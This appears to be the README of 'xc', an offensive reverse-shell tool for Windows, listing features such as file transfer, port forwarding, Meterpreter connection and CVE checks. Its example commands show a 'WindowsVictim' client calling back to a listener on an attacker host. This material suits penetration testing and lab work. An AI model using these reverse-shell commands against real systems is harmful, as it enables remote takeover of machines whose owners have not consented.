# xc

Netcat like reverse shell for Windows. Can be run as server on Windows & Linux, while the Client part is only implemented for Windows (yet).

## Features

* File Up-/Download
* Port Forwarding
* Change users (like runas)
* Connect to Meterpreter Listener (windows/meterpreter/reverse_tcp)
* Quick vulnerability check for recent impactful CVEs
* Simple Plugin System

## Examples

- Linux Attacker:	`xc -l -p 1337`			    (Server)
- WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)


[![asciicast](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5.svg)](https://asciinema.org/a/g4jkA6N99GqUqJkDzsboj5ZJ5)

## Setup

Windows:
```
go get github.com/hashicorp/yamux
go build
```

Linux:
```
make
```
